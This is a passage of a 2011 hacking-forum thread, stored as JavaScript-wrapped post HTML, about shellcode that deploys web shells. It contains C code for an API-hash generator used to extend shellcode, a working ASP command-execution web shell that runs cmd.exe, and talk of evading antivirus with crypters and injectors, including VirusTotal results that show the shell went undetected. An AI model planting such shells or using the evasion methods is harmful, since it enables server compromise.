+pd[2688] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2688">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">03:27 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2688" href="showthread.php?t=708&amp;p=2688&amp;viewfull=1#post2688" class="postcounter">#5</a><a id="postcount2688" name="5"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=2" title="b0nd is offline"><strong>b0nd</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=2" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=2&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=2" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=2" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/2-b0nd" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="b0nd is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				... I am no Expert b0nd.g4h@gmail.com\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2688_2" title="b0nd is a jewel in the rough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=2" title="b0nd is offline">\r\n				<img src="image.php?u=2&amp;dateline=1278296558" alt="b0nd\'s Avatar" title="b0nd\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>irc.freenode.net #g4h</dd>\r\n					\r\n					<dt>Posts</dt> <dd>744</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2688">\r\n						<blockquote class="postcontent restore ">\r\n							Nice observation and creativity Fb1. Good work!\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><i>[*] To follow the path: look to the master, follow the master,  walk with the master, see through the master,<br />\r\n               -' + '-' + '-' + '-' + '-' + '->  become the master!!! <-' + '-' + '-' + '-' + '-' + '-<br />\r\n[*] Everyone has a will to WIN but very few have the will to prepare to WIN<br />\r\n[*] Invest yourself in everything you do, there\'s fun in being serious</i></div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2688" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2688" class="newreply" href="newreply.php?do=newreply&amp;p=2688" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2688" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2690] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2690">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">03:49 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2690" href="showthread.php?t=708&amp;p=2690&amp;viewfull=1#post2690" class="postcounter">#6</a><a id="postcount2690" name="6"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=1" title="Punter is offline"><strong>Punter</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=1" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=1&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=1" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=1" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://punter-infosec.com/" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/1-Punter" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="Punter is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Administrator\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2690_1" title="Punter ">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_off.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=1" title="Punter is offline">\r\n				<img src="image.php?u=1&amp;dateline=1304491339" alt="Punter\'s Avatar" title="Punter\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>Above Sea level</dd>\r\n					\r\n					<dt>Posts</dt> <dd>163</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2690">\r\n						<blockquote class="postcontent restore ">\r\n							great dude this what we say Pown like a RockStar\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><br /><span class="smallfont"><i>To view links or images in signatures your post count must be 10 or greater. You currently have 0 posts.</i></span><br /><br />\r\n<br /><span class="smallfont"><i>To view links or images in signatures your post count must be 10 or greater. You currently have 0 posts.</i></span><br /><br />\r\n<br /><span class="smallfont"><i>To view links or images in signatures your post count must be 10 or greater. You currently have 0 posts.</i></span><br /><br />\r\n<br />\r\nHire a Hacker by the <b>Night</b> and Hire a Chief Security Officer (CSO)  by the <b>Day</b>.</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2690" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2690" class="newreply" href="newreply.php?do=newreply&amp;p=2690" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2690" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2695] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2695">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">09:05 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2695" href="showthread.php?t=708&amp;p=2695&amp;viewfull=1#post2695" class="postcounter">#7</a><a id="postcount2695" name="7"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=17" title="DouBle_Zer0 is offline"><strong>DouBle_Zer0</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=17" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=17&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=17" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=17" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/17-DouBle_Zer0" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="DouBle_Zer0 is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2695_17" title="DouBle_Zer0 is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>37</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					Hash Generator for above shellcode\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2695">\r\n						<blockquote class="postcontent restore ">\r\n							Guys this is the Hash generator (API) for FB1H2S shellcode you can use this to extend the shellcode functionality.<br />\r\n<br />\r\n#include &lt;stdio.h&gt;<br />\r\n#include &lt;stdlib.h&gt;<br />\r\n#include &lt;string.h&gt;<br />\r\nunsigned int hash_by(void *,unsigned short int);  <i>//Prototyping</i><br />\r\n<font color="Red">int main()<br />\r\n{<br />\r\n    char b[50];<br />\r\n    printf(&quot;Enter the string: &quot;);<br />\r\n    scanf(&quot;%s&quot;,b);<br />\r\n    if (strlen(b) &gt; 49)<br />\r\n    {<br />\r\n                  printf(&quot;string is too large <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />&quot;);<br />\r\n                  exit(0);<br />\r\n    }<br />\r\n    printf(&quot; %s 0x%08x\\n&quot;,b,hash_by(b,0xd)); //function call<br />\r\n    system(&quot;pause&quot;);<br />\r\n}<br />\r\nunsigned int hash_by(void *key,unsigned short int num)<br />\r\n{<br />\r\n    unsigned int hash = 0;<br />\r\n    char *c = (char *)key;<br />\r\n <br />\r\n        while (*c != 0)<br />\r\n        {<br />\r\n                hash = hash &lt;&lt; (32-num) | hash &gt;&gt; (num);<br />\r\n                hash += *c;<br />\r\n                c++;<br />\r\n        }<br />\r\n <br />\r\n    return hash;<br />\r\n}              </font><br />\r\n<br />\r\n<br />\r\n<br />\r\n/<br />\r\nDZZ\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">-' + '-<br />\r\nWhen you know what you want,and you want it badly enough,you\'ll find a way to get it.</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2695" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2695" class="newreply" href="newreply.php?do=newreply&amp;p=2695" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2695" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2694] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2694">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">08:55 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2694" href="showthread.php?t=708&amp;p=2694&amp;viewfull=1#post2694" class="postcounter">#8</a><a id="postcount2694" name="8"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=17" title="DouBle_Zer0 is offline"><strong>DouBle_Zer0</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=17" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=17&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=17" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=17" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/17-DouBle_Zer0" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="DouBle_Zer0 is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2694_17" title="DouBle_Zer0 is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>37</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2694">\r\n						<blockquote class="postcontent restore ">\r\n							well buddy Anti viruses are not completely lamer they can detect php,asp shells as well.. <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />. SO there is no big difference between traditional &quot;Download and execute&quot; and your &quot;Download and Deploy&quot; shellcode, all are download driven shellcode . Infact you are also executing your shell, the only difference is you are executing it from browser so antivirus will definitely flag it.<img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />. And if you want to change ur ASP shell to evade AV then i think we can also change EXE\'s to evade antiviruses.. another big problem with this shellcode is that its functionality is limited both from attacking point of view (only web server) to executing point of view (limited functionality by shells).<br />\n<br />\nThe second point is where we use it means direct memory execution/injection or make exe and execute it independently (in POST exploitation). if the point is first means direct execution then why we use this means we can execute a cmd or meterpreter and then can transfer whatever we want <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> and if the point is second means post exploitation then i think it is better to execute a executable or dll.<br />\n<br />\nSo the success of download driven shellcodes is depends on antiviruse weaknesses. The one way you can beat them is the way of &quot;Injector&quot; believe me or not but the answer is &quot;Yes&quot; and another way is &quot;crypters/compressors&quot; for executables.<br />\n<br />\ncan we use it with client side exploits ? <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\n<br />\nP.S plz don\'t consider me offensive<br />\n<br />\n<br />\nthnx<br />\nDZZ\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">-' + '-<br />\r\nWhen you know what you want,and you want it badly enough,you\'ll find a way to get it.</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2694" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2694" class="newreply" href="newreply.php?do=newreply&amp;p=2694" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2694" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2698] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2698">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-19-2011,&nbsp;<span class="time">12:12 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2698" href="showthread.php?t=708&amp;p=2698&amp;viewfull=1#post2698" class="postcounter">#9</a><a id="postcount2698" name="9"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2698_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2698">\r\n						<blockquote class="postcontent restore ">\r\n							<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				well buddy Anti viruses are not completely lamer they can detect php,asp shells as well.. . SO there is no big difference between traditional &quot;Download and execute&quot; and your &quot;Download and Deploy&quot; shellcode, all are download driven shell code\r\n			\r\n		</div>\r\n	</div>\r\n</div>Well totally disagree , below is a a very popular web shell that every Tom dick harry who is into web application attacks has used at one point of time. <br />\n<br />\nA simple command execution shell in asp <div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:120px;">On Error Resume Next\n dim resp\n  dim execute= &quot;cmd.exe&quot;\n  \' -' + '- create the COM objects that we will be using -' + '- \'\n  Set woot = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)\n  Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)\n  resp = woot.Run (&quot;&amp; execute /c &quot; dir, 0, True)\n  Response.Write Server.HTMLEncode(resp)</pre>\r\n</div><b>And this is the Output of the virus Total scan results</b><br />\n<br />\n<a href="http://www.virustotal.com/file-scan/report.html?id=1b686ac4c7ffca2e546e3c82d0b9012109f74d72f957615395b043923b83054e-1295374370" target="_blank">http://www.virustotal.com/file-scan/...54e-1295374370</a><br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				<font size="3">Submission date:<br />\n2011-01-18 18:12:50 (UTC)<br />\nCurrent status:<br />\nqueued queued analysing finished<br />\nResult:<br />\n0/ 42 (0.0%)</font>\r\n			\r\n		</div>\r\n	</div>\r\n</div>No antivirus have detected, simply coz web application signature based detection is not a good idea. And I ain\'t gone explain more on that now, play around a lil bit nd u will get it. <br />\n<br />\nWhy should I say more our own member <b>41w4riro </b>web shell chakraview which was build in 2008 (2-3 years back) pretty old here is the scan results of that <br />\n<a href="http://www.virustotal.com/file-scan/report.html?id=736ce9b6e2fc4297e4efcd7f6ddd4d62bfc46ec0f737cbc2805b30b6136ce920-1295373738" target="_blank">http://www.virustotal.com/file-scan/...920-1295373738</a><br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				File name:<br />\nsystem.ASP<br />\nSubmission date:<br />\n2011-01-18 18:20:00 (UTC)<br />\nCurrent status:<br />\nqueued (#6) queued (#7) analysing finished<br />\nResult:<br />\n17/ 43 (39.5%)\r\n			\r\n		</div>\r\n	</div>\r\n</div> and here only 17 out of 43 detected it , you should probably experiment a little with web applications I guess.<br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				Infact you are also executing your shell, the only difference is you are executing it from browser so antivirus will definitely flag it.\r\n			\r\n		</div>\r\n	</div>\r\n</div>Its not the browser that executes the code but, the targets web server take in our request and feed it to an interpreter [php,.net,pl] etc and there the commands are run inside an interpreter,lts totally different considering an executable payload . <br />\n<br />\nAnd about Injector payload &quot; There already exist as Msf, dll inject payload, not inject into memory coz when you exploit an over flow bug you are executing the code inside that application in context of the user/service its running so there is no point in using a separate Injector payload :P that would make it lame  D.<br />\n<br />\nAnd name a technique that would be effective against Firewalls ??<br />\n<br />\n[Scenario:]<br />\nOnly web server(often found) and a couple more ports are enabled rest behind firewall &quot;no out bound inbound connections on any other ports&quot;, and you found an exploitable program and code execution is possible , unless and until ur injected code is capable of hooking to sockets used by the vul application and using its on ports to throw shell out, it would be use full, else point less <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />. So this scenario also Web shells are handy <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />. <br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				 can we use it with client side\r\n			\r\n		</div>\r\n	</div>\r\n</div>we could use it, provided client have a web server supporting php or some other cgi and now we even have a Php metpreter shell &quot; thanks bond for suggesting tht&quot;. But using this kind of shellcode for client side exploits is totally stupid. <br />\n<br />\nAny more taught we could discuss further <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> .\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2698" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2698" class="newreply" 